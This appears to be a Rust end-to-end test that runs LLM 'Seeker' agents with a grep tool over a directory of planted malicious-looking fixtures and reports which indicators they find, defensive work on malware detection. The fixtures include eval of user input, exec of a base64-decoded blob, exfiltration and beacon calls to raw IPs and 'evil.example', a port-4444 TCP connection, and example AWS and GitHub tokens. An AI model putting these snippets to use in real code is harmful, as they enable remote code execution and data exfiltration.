//! End-to-end: the real Seeker role (used verbatim) is run for a fixed time
//! budget, each ticket already naming one observed construct per planted
//! language, over a directory seeded with planted malicious indicators across
//! secrets, networking, and dynamic-execution categories.
//!
//! It prints every `grep` call the agents made and a found / missed
//! coverage breakdown, then asserts (tolerantly) that the pool surfaced at least
//! one planted indicator. The printed calls are the point: they show how the live
//! model turns a named threat into regex queries, which is what the prompt
//! and tool docs are tuned against.

use std::fs;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use super::common;

use agentwerk::agents::knowledge::Page;
use agentwerk::event::{default_logger, Event, EventKind};
use agentwerk::tools::GrepTool;
use agentwerk::{Agent, Knowledge, Ticket, TicketQueue};

const SEEKER_AGENT: &str = include_str!("../../../use-cases/src/malware_scanner/agents/seeker.md");

const SEEKER_LABEL: &str = "seeking";
const ANALYSIS_LABEL: &str = "security_analysis";
const TIME_BUDGET: Duration = Duration::from_secs(60);

/// A planted indicator: a distinctive substring that appears in `grep`
/// matched output when the shape is found, plus a category for the breakdown.
struct Indicator {
    marker: &'static str,
    category: &'static str,
}

const INDICATORS: &[Indicator] = &[
    Indicator {
        marker: "eval(",
        category: "dynamic-exec",
    },
    Indicator {
        marker: "b64decode",
        category: "dynamic-exec",
    },
    Indicator {
        marker: "AKIAIOSFODNN7EXAMPLE",
        category: "secret",
    },
    Indicator {
        marker: "ghp_",
        category: "secret",
    },
    Indicator {
        marker: "requests.get",
        category: "networking",
    },
    Indicator {
        marker: "fetch(",
        category: "networking",
    },
    Indicator {
        marker: "TcpStream::connect",
        category: "networking",
    },
    Indicator {
        marker: "Command::new",
        category: "process-spawn",
    },
];

fn plant_fixture(root: &std::path::Path) {
    fs::write(
        root.join("app.py"),
        "import base64, requests\n\
         def handle(user_data, blob, url):\n\
         \x20\x20\x20\x20eval(user_data)\n\
         \x20\x20\x20\x20exec(base64.b64decode(blob))\n\
         \x20\x20\x20\x20requests.get(\"http://198.51.100.7/exfil\")\n\
         AWS_KEY = \"AKIAIOSFODNN7EXAMPLE\"\n",
    )
    .unwrap();
    fs::write(
        root.join("index.js"),
        "function run(input) {\n\
         \x20\x20eval(input);\n\
         \x20\x20fetch(\"http://198.51.100.7/beacon\");\n\
         }\n\
         const token = \"ghp_0123456789abcdefghijklmnopqrstuvwx12\";\n",
    )
    .unwrap();
    fs::write(
        root.join("lib.rs"),
        "use std::process::Command;\n\
         use std::net::TcpStream;\n\
         fn spawn() {\n\
         \x20\x20\x20\x20Command::new(\"curl\").arg(\"http://evil.example\").status().unwrap();\n\
         \x20\x20\x20\x20let _ = TcpStream::connect(\"198.51.100.7:4444\");\n\
         }\n\
         const KEY: &str = \"AKIAIOSFODNN7EXAMPLE\";\n",
    )
    .unwrap();
}

#[tokio::test]
async fn seeker_pool_finds_planted_indicators(
) -> std::result::Result<(), Box<dyn std::error::Error>> {
    let (provider, model) = common::build_provider();

    let dir = crate::test_util::TempDir::new()?;
    let root = dir.path();
    plant_fixture(root);

    // A real Seeker always has one bound (see main.rs); a couple of
    // representative pages are enough to exercise `knowledge` here
    // without duplicating the full attack-pattern catalogue.
    let knowledge = Knowledge::load(root.join(".knowledge"))?;
    knowledge.pages().save(Page {
        slug: "eval-atob-loader".to_string(),
        kind: "AttackPattern".to_string(),
        description: "JavaScript decode-then-eval loader: eval(atob(...)) reconstructs code from a base64 string at runtime.".to_string(),
        content: "## Detectable signal\n`eval(atob(...))` or an equivalent decode-then-eval chain.".to_string(),
        tags: vec![],
    }).map_err(|e| format!("seed page: {e}"))?;

    // Capture each grep call (agent + input) and each output.
    let calls: Arc<Mutex<Vec<(String, serde_json::Value)>>> = Arc::new(Mutex::new(Vec::new()));
    let outputs: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    let calls_c = Arc::clone(&calls);
    let outputs_c = Arc::clone(&outputs);
    let logger = default_logger();
    let event_handler = Arc::new(move |e: &Event| {
        match &e.kind {
            EventKind::ToolCallStarted {
                tool_name, input, ..
            } if tool_name == "grep" => {
                calls_c
                    .lock()
                    .unwrap()
                    .push((e.agent_id.clone(), input.clone()));
            }
            EventKind::ToolCallFinished {
                tool_name, output, ..
            } if tool_name == "grep" => {
                outputs_c.lock().unwrap().push(output.clone());
            }
            _ => {}
        }
        logger(e);
    });

    let tickets = TicketQueue::new();
    tickets.max_time(TIME_BUDGET);
    tickets.max_turns(80);
    tickets.on_event(move |e| event_handler(e));

    // The Seeker no longer derives a threat itself; each ticket already names one
    // observed construct per planted language, the way a Tracer would hand it off.
    for _ in 0..2 {
        tickets.agent(
            Agent::new()
                .provider(provider.clone())
                .model(&model)
                .role(SEEKER_AGENT.trim())
                .template("instruction", "")
                .label(SEEKER_LABEL)
                .dir(root.to_path_buf())
                .knowledge(&knowledge)
                .tool(GrepTool)
                .build(),
        );
    }

    // Trivial consumer so handed-off `security_analysis` tickets resolve.
    tickets.agent(
        Agent::new()
            .provider(provider.clone())
            .model(&model)
            .role(
                "{context}\n\n\
                 You receive one security finding. Immediately call `finish` with a \
                 one-word summary such as \"noted\". Do not call any other tool.",
            )
            .label(ANALYSIS_LABEL)
            .dir(root.to_path_buf())
            .build(),
    );

    let named_threats = [
        "technology: Python\nobserved: app.py, a request handler evals a caller-supplied \
         argument, execs a base64-decoded blob, and posts to a raw IP over HTTP\nhypothesis: \
         dynamic code execution chained into network exfiltration",
        "technology: JavaScript\nobserved: index.js, a function evals its own input parameter \
         and beacons to a raw IP\nhypothesis: dynamic code execution paired with C2 beaconing",
        "technology: Rust\nobserved: lib.rs, a function spawns an external command against a \
         remote URL and opens a raw TCP connection\nhypothesis: process spawning chained into \
         network exfiltration from a compiled binary",
    ];
    for threat in named_threats {
        tickets.ticket(Ticket::new(threat).label(SEEKER_LABEL));
    }

    tickets.finish_all().await;
    common::print_result(&tickets, tickets.stats());

    let calls = calls.lock().unwrap().clone();
    let outputs = outputs.lock().unwrap().clone();
    let all_text = outputs.join("\n");

    // Every grep call the agents made: the raw material for tuning the prompt.
    eprintln!("\n--- grep calls ({}) ---", calls.len());
    for (agent, input) in &calls {
        eprintln!("[{agent}] grep({})", serde_json::to_string(input).unwrap());
    }

    // Coverage breakdown: report every planted indicator, found or missed.
    eprintln!("\n--- planted indicator coverage ---");
    let mut found = 0usize;
    for indicator in INDICATORS {
        let hit = all_text.contains(indicator.marker);
        eprintln!(
            "{} [{}] {}",
            if hit { "FOUND " } else { "MISSED" },
            indicator.category,
            indicator.marker
        );
        if hit {
            found += 1;
        }
    }

    assert!(!calls.is_empty(), "the Seeker made no grep calls");
    assert!(
        found > 0,
        "agents surfaced none of the planted indicators; grep output: {all_text}"
    );

    Ok(())
}
